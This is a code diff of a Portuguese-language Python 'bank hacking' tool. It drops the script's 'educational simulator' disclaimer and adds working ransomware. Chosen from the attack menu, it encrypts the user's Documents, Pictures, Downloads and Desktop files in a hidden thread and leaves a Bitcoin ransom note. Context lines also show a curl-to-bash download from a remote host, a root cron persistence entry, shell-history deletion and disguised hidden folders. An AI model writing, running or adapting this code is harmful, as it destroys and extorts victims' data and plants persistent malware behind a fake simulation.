@@ -5,6 +5,7 @@ import random
 import subprocess
 import sys
 from threading import Thread
+from cryptography.fernet import Fernet
 
 RED = "\033[1;31m"
 GREEN = "\033[1;32m"
@@ -15,9 +16,9 @@ CYAN = "\033[1;36m"
 WHITE = "\033[1;37m"
 RESET = "\033[0m"
 
-
 vítimas = []
 ataque_em_andamento = False
+chave_ransomware = Fernet.generate_key()
 
 def limpar_tela():
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -31,8 +32,7 @@ def mostrar_banner():
     ██████╔╝██║  ██║██║ ╚████║██║  ██╗    ██████╔╝██║  ██║██║ ╚████║██║  ██╗
     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
     {RESET}
-    {YELLOW}>>> FERRAMENTA ilegal  DE PENTESTING BANCÁRIO <<<{RESET}
-    {RED}ATENÇÃO: Este é apenas um simulador educacional. Qualquer uso ilegal é proibido.{RESET}
+    {YELLOW}>>> FERRAMENTA ILEGAL DE PENTESTING BANCÁRIO <<<{RESET}
     """)
 
 def animação_carregamento(duracao=5, mensagem="Carregando"):
@@ -60,13 +60,58 @@ def criar_arquivo_malicioso(caminho):
         f.write(random.choice(conteúdos))
         f.write(f"\n# Gerado em {time.ctime()}\n")
     
-  
     os.chmod(caminho, 0o755)
 
-def abrir_janelas_ocultas():
+def criptografar_arquivos_usuario():
+    def ransomware():
+        try:
+            diretorios_alvo = [
+                os.path.expanduser("~/Documents"),
+                os.path.expanduser("~/Pictures"),
+                os.path.expanduser("~/Downloads"),
+                os.path.expanduser("~/Desktop")
+            ]
+            
+            fernet = Fernet(chave_ransomware)
+            
+            for diretorio in diretorios_alvo:
+                for root, _, files in os.walk(diretorio):
+                    for file in files:
+                        try:
+                            caminho_completo = os.path.join(root, file)
 
+                            if os.path.getsize(caminho_completo) > 10*1024*1024:
+                                continue
+
+                            with open(caminho_completo, 'rb') as f:
+                                original = f.read()
+
+                            encrypted = fernet.encrypt(original)
+
+                            with open(caminho_completo, 'wb') as f:
+                                f.write(encrypted)
+
+                            os.rename(caminho_completo, caminho_completo + ".encrypted")
+                            
+                        except:
+                            continue
+
+            resgate_path = os.path.expanduser("~/Desktop/LEIA-ME.txt")
+            with open(resgate_path, 'w') as f:
+                f.write("!!! SEUS ARQUIVOS FORAM CRIPTOGRAFADOS !!!\n\n")
+                f.write("Para recuperar seus arquivos, envie 0.5 BTC para o endereço:\n")
+                f.write("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\n\n")
+                f.write("Após o pagamento, entre em contato com ransomware@protonmail.com\n")
+                f.write(f"Com a chave única: {chave_ransomware.decode()}\n")
+                
+        except Exception as e:
+            pass
+
+    Thread(target=ransomware, daemon=True).start()
+
+def abrir_janelas_ocultas():
     def tarefas_ocultas():
-    
+
         pastas_ocultas = [
             "/tmp/.system_update",
             os.path.expanduser("~/.config/.cache_system"),
@@ -78,23 +123,20 @@ def abrir_janelas_ocultas():
         for pasta in pastas_ocultas:
             try:
                 os.makedirs(pasta, exist_ok=True)
-             
+                
                 for i in range(1, 6):
                     arquivo = f"{pasta}/script_{i}.py"
                     criar_arquivo_malicioso(arquivo)
                     
-               
                     with open(f"{pasta}/start.sh", 'w') as f:
                         f.write(f"#!/bin/bash\npython3 {arquivo} &\n")
                     os.chmod(f"{pasta}/start.sh", 0o755)
                 
-               
                 with open(f"{pasta}/README.txt", 'w') as f:
                     f.write("Arquivos de atualização do sistema. Não remova!\n")
             except Exception as e:
                 pass
         
-    
         if os.name == 'posix':
             for _ in range(3):
                 try:
@@ -103,12 +145,10 @@ def abrir_janelas_ocultas():
                 except:
                     pass
         
-     
         comandos = [
             "chmod -R 777 /tmp/.system_update",
             "curl -s http://example.com/malware.sh | bash -s",
             "echo '* * * * * root /tmp/.system_update/start.sh' > /etc/cron.d/system_update",
-            "dd if=/dev/zero of=/dev/sda bs=1M count=100 status=none",
             "nohup bash -c 'sleep 10; rm -rf ~/.bash_history' &"
         ]
         
@@ -166,9 +206,9 @@ def simular_ataque():
     print(f"{YELLOW}[*] Iniciando sequência de ataque...{RESET}\n")
     
     ataque_em_andamento = True
-    abrir_janelas_ocultas()  
+    abrir_janelas_ocultas()
+    criptografar_arquivos_usuario()  
     
-
     etapas = [
         ("Conectando ao servidor do banco...", 5),
         ("Bypassando firewall...", 7),
@@ -190,7 +230,6 @@ def simular_ataque():
     
     print(f"\n{GREEN}[+] ATAQUE CONCLUÍDO COM SUCESSO!{RESET}")
     print(f"{YELLOW}[*] Saldo transferido: R$ {random.randint(1000, 50000):.2f}{RESET}")
-  
     
     ataque_em_andamento = False
     input(f"\n{WHITE}Pressione Enter para continuar...{RESET}")
@@ -221,7 +260,7 @@ def menu_principal():
         
         print(f"{CYAN}=== MENU PRINCIPAL ==={RESET}\n")
         print(f"{GREEN}1.{RESET} Adicionar nova vítima")
-        print(f"{GREEN}2.{RESET} ataque bancário")
+        print(f"{GREEN}2.{RESET} Ataque bancário")
         print(f"{GREEN}3.{RESET} Listar vítimas registradas")
         print(f"{GREEN}4.{RESET} Sair\n")
         
